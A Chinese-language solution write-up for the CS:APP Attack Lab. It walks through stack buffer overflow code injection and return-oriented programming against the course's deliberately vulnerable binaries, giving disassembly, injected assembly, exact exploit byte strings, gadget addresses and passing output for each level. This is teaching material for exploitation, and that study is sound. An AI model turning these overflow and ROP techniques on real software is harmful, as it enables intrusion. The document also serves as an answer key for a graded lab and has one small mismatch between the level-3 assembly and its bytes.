## 代码注入

通过使缓冲区溢出，注入攻击代码。

### level 1

第一阶段，我们并不需要进行代码注入，我们需要做的就是劫持程序流，将函数的正常返回地址给重写，将函数重定向到我们指定的特定函数。在这个阶段中，我们要重定向到`touch1`函数。

```s
(gdb) disas getbuf # 反汇编getbuf函数
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp 
   # 在栈上为buf提供了0x28也就是40个字节的空间
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
End of assembler dump

(gdb) disas touch1 # 反汇编touch1函数
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   # touch1的返回地址是0x00000000004017c0
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
End of assembler dump.
```

现在我们可以知道，我们需要用`0x28`字节来将栈填满，再写入`touch1`函数的入口地址，在`getbuf`函数执行到`ret`指令的时候就会返回到`touch1`中执行。

下面就要利用官方提供的`hex2raw`程序来帮助我们生成攻击字符串，这个程序将以空白字符隔开表示的字节转换成真正的二进制字节，注意这个程序只是原样地转换文件中的字符，所以字节序的问题是我们应该考虑的。

```bash
$ ./hex2raw -i solutions/lv1.txt| ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

前`0x28`个字节都使用`0x00`来填充，然后在溢出的8个字节中写入了`touch1`的首地址`0x4017c0`，注意字节序就可以了。

### level 2

第二阶段，我们需要做的就是在输入字符串中注入一小段代码。其实整体的流程还是`getbuf`中输入字符，然后拦截程序流，跳转到调用`touch2`函数。

首先，我们查看`touch2`函数：

```c
void touch2(unsigned val) { // 验证传进来的参数val是否和cookie中值相等。
  vlevel = 2;
  if (val == cookie) {
    printf("Touch2!: You called touch2(0x%.8x)\n", val);
    validate(2);
  } else {
    printf("Misfire: You called touch2(0x%.8x)\n", val);
    fail(2);
  }
  exit(0);
}
```

如何让程序去执行我们的代码呢？既然我们可以向栈中写入任意内容并且可以设置返回时跳转到的地址，那么我们就可以通过在栈中写入指令，再令从getbuf函数返回的地址为我们栈中指令的首地址，在指令中执行ret进行第二次返回，返回到touch2函数，就可以实现我们的目的。

我们可以将指令写入到栈地址的最低处，然后在溢出后将地址设置为这个栈地址。我们能完成这个攻击的前提是讲义中已经告诉我们这个具有漏洞的程序在运行时的栈地址是固定的，不会因运行多次而改变，并且这个程序允许执行栈中的代码。

思路：


1. 将正常的返回地址设置为注入代码的地址
2. 将cookie值移入到`%rdi`，`%rdi`是函数调用的第一个参数
3. 获取`touch2`的起始地址
4. 想要调用`touch2`，而又不能直接使用`call`,`jmp`等指令，所以只能使用`ret`改变当前指令寄存器的指向地址。


由于我们需要在注入的代码中再次返回，就需要将二次返回的地址同样存放在栈中，放在栈顶即可。

通过gdb反汇编找到`touch2`的起始地址

```s
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:     sub    $0x8,%rsp
   0x00000000004017f0 <+4>:     mov    %edi,%edx
   0x00000000004017f2 <+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:    jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:    mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:    mov    $0x1,%edi
   0x000000000040180e <+34>:    mov    $0x0,%eax
   0x0000000000401813 <+39>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:    mov    $0x2,%edi
   0x000000000040181d <+49>:    callq  0x401c8d <validate>
   0x0000000000401822 <+54>:    jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:    mov    $0x403110,%esi
   0x0000000000401829 <+61>:    mov    $0x1,%edi
   0x000000000040182e <+66>:    mov    $0x0,%eax
   0x0000000000401833 <+71>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:    mov    $0x2,%edi
   0x000000000040183d <+81>:    callq  0x401d4f <fail>
   0x0000000000401842 <+86>:    mov    $0x0,%edi
   0x0000000000401847 <+91>:    callq  0x400e40 <exit@plt>
End of assembler dump.
```

可以得到如下汇编攻击代码`inject_lv2.s`：

```s
movq    $0x59b997fa, %rdi # 将cookie值移入函数调用参数
pushq   $0x4017ec         # 将touch2地址压栈
ret                       # 读取栈顶指针指向的地址并跳转
```

```s
$ gcc -c inject_lv2.s    
$ objdump -d inject_lv2.o

inject_lv2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
```


通过gdb查看`rsp`指向的地址

```s
(gdb) break getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) run -q
Starting program: /root/csapp-lab/attacklab/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12      buf.c: No such file or directory.
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
End of assembler dump.
(gdb) stepi
14      in buf.c
(gdb) x /64xb $rsp
0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x09    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
```

可以看到首地址为`0x5561dc78`。

于是我们可以构造攻击用的二进制字节：

```
48 c7 c7 fa 97 b9 59 68 ec 17 
40 00 c3 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00
```

填充后的栈组织如下图所示

![填充后的栈组织](https://upload-images.jianshu.io/upload_images/1433829-fa485a0533812b76.png)

```bash
./hex2raw -i solutions/lv2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

### level 3

第三阶段，也是需要在输入的字符串中注入一段代码，但是不同于第二阶段的是，在这一阶段中我们需要传递字符串作为参数。

在这一段中我们需要劫持控制流，在正常返回的时候，跳转到`touch3`函数，其中`touch3`函数的代码如下：

```c
void touch3(char *sval) {
  vlevel = 3;
  if (hexmatch(cookie, sval)) {
    printf("Touch3!: You called touch3(\"%s\")\n", sval);
    validate(3);
  } else {
    printf("Misfire: You called touch3(\"%s\")\n", sval);
    fail(3);
  }
  exit(0);
}
```

在`touch3`函数中调用了`hexmatch`函数，这个函数的功能是匹配`cookie`和传进来的字符是否匹配。在本文中`cookie`的值是`0x59b997fa`，所以我们传进去的参数应该是`"59b997fa"`。

```c
int hexmatch(unsigned val, char *sval) {
  char cbuf[110];
  char *s = cbuf + random() % 100;
  sprintf(s, "%.8x", val);
  return strncmp(sval, s, 9) == 0;
}
```

当调用`hexmatch`和`strncmp`时，它们会把数据压入到栈中，有可能会覆盖`getbuf`栈帧的数据，所以传入字符串的位置必须小心谨慎。

因为`char *s = cbuf + random() % 100;`，`s`的位置随机，所以如果字符串放在`gethuf`中并不可靠，其可能会被`hexmatch`压入到栈中的数据覆盖。

我们把字符串放在`getbuf`的父栈帧中，也就是`test`栈帧中。

思路：

1. 将`cookie`字符串转化为16进制
2. 将字符串的地址传送到`%rdi`中
3. 和level 2一样，想要调用`touch3`函数，则先将`touch3`函数的地址压栈，然后调用`ret`指令。

可以得到注入的汇编代码：

```s
movq    $0x5561dca8, %rdi
pushq   0x4018fa
ret
```

将上述的汇编代码转化为计算机可以执行的指令序列，执行下列命令：

```bash
$ gcc -c inject_lv3.s 
$ objdump -d inject_lv3.o 

inject_lv3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   ff 34 25 fa 18 40 00    pushq  0x4018fa
   e:   c3                      retq
```

得到这三条指令字节序列`48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3`

使用`man ascii`命令，可以得到``cookie``的16进制数表示:`35 39 62 39 39 37 66 61 00`，可构建字节序列如下：

```
48 c7 c7 a8 dc 61 55 68 fa 18 
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 35 39
62 39 39 37 66 61 00
```

栈组织示意图：

![](https://upload-images.jianshu.io/upload_images/1433829-4f564d4ccfc8b962.png)

```bash
$ ./hex2raw -i solutions/lv3.txt| ./ctarget -q 
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

## 返回导向编程攻击

返回导向编程(Return-oriented programming, ROP)是使用程序里既有的字节代码攻击程序。

### level 2

用ROP重新实现level 2中的任务

我们需要的代码序列如下：

```s
popq %rax
movq %rax, %rdi
```

`popq %rax`的指令字节为：`58`，所以我们找到了如下函数：

```s
00000000004019a7 <addval_219>:
  4019a7: 8d 87 51 73 58 90     lea    -0x6fa78caf(%rdi),%eax
  4019ad: c3 
```

从中我们可以得出`popq %rax`指令的地址为：`0x4019ab`

`movq %rax, %rdi`的指令字节为：`48 89 c7`，所以我们找到了如下函数：

```s
00000000004019a0 <addval_273>:
  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
  4019a6: c3  
```
从中我们可以得出`movq %rax, %rdi`指令的地址为：`0x4019a2`

所以我们可以这样构造字节序列：

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

组织结构如下：

!()[https://upload-images.jianshu.io/upload_images/1433829-45d42fcf3d5bcca4.png]

```bash
$ ./hex2raw -i solutions/lv4.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

### level 3

在这一阶段中，我们需要做的就是把字符串的起始地址，传送到`%rdi`,然后调用`touch3`函数。

因为每次栈的位置是随机的，所以无法直接用地址来索引字符串的起始地址，只能用**栈顶地址 + 偏移量来索引字符串的起始地址**。从farm中我们可以获取到这样一个`gadget`：`lea (%rdi,%rsi,1),%rax`，这样就可以把字符串的首地址传送到`%rax`。

解题思路：

（1）首先获取到`%rsp`的地址，并且传送到`%rdi`
（2）其二获取到字符串的偏移量值，并且传送到`%rsi`
（3）`lea (%rdi,%rsi,1),%rax`, 将字符串的首地址传送到`%rax`, 再传送到`%rdi`
（4）调用touch3函数

#### 获取到%rsp的地址

```s
0000000000401a03 <addval_190>:
  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax
  401a09: c3  
```

`movq %rsp, %rax`的指令字节为：`48 89 e0`, 所以这一步的gadget地址为：`0x401a06`

#### 将%rax的内容传送到%rdi

```s
00000000004019a0 <addval_273>:
  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
  4019a6: c3
```

`movq %rax, %rdi`的指令字节为：`48 89 c7`，所以这一步的gadget地址为：`0x4019a2`

#### 将偏移量的内容弹出到`%rax`

```s
00000000004019ca <getval_280>:
  4019ca: b8 29 58 90 c3        mov    $0xc3905829,%eax
  4019cf: c3   
```
`popq %rax`的指令字节为：58， 其中90为`nop`指令, 所以这一步的gadget地址为：`0x4019cc`

#### 将`%eax`的内容传送到`%edx`

```s
00000000004019db <getval_481>:
  4019db: b8 5c 89 c2 90        mov    $0x90c2895c,%eax
  4019e0: c3    
`movl %eax, %edx`的指令字节为:`89 c2`, 所以这一步的gadget地址为：`0x4019dd`
```

#### 将`%edx`的内容传送到`%ecx`

```s
0000000000401a6e <setval_167>:
  401a6e: c7 07 89 d1 91 c3     movl   $0xc391d189,(%rdi)
  401a74: c3  
```

`movl %edx, %ecx`的指令字节为：`89 d1`，所以这一步的gadget地址为：`0x401a70`

#### 将`%ecx`的内容传送到`%esi`

```s
0000000000401a11 <addval_436>:
  401a11: 8d 87 89 ce 90 90     lea    -0x6f6f3177(%rdi),%eax
  401a17: c3                    retq 
```
`movl %ecx, %esi`的指令字节为：`89 ce`, 所以这一步gadget地址为：`0x401a13`

#### 将栈顶 + 偏移量得到字符串的首地址传送到`%rax`

```s
00000000004019d6 <add_xy>:
  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax
  4019da: c3                    retq 
```

这一步的gadget地址为：`0x4019d6`

#### 将字符串首地址`%rax`传送到`%rdi`

```s
00000000004019a0 <addval_273>:
  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
  4019a6: c3
```

`movq %rax, %rdi`的指令字节为：`48 89 c7`，所以这一步的gadget地址为：`0x4019a2`

栈的结构如下：

![](https://upload-images.jianshu.io/upload_images/1433829-cafcf76d35ef7ba1.png)

综上所述，我们可以得到字符串首地址和返回地址之前隔了9条指令，所以偏移量为72个字节，也就是0x48，可以的到如下字符序列如下：

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
cc 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61 00
```

结果验证

```bash
$ ./hex2raw -i solutions/lv5.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

## reference

1. [深入理解计算机系统（CS:APP) - Attack Lab详解](https://www.viseator.com/2017/07/18/CS_APP_AttackLab/)
2. [CSAPP:Attack lab](https://www.jianshu.com/p/db731ca57342)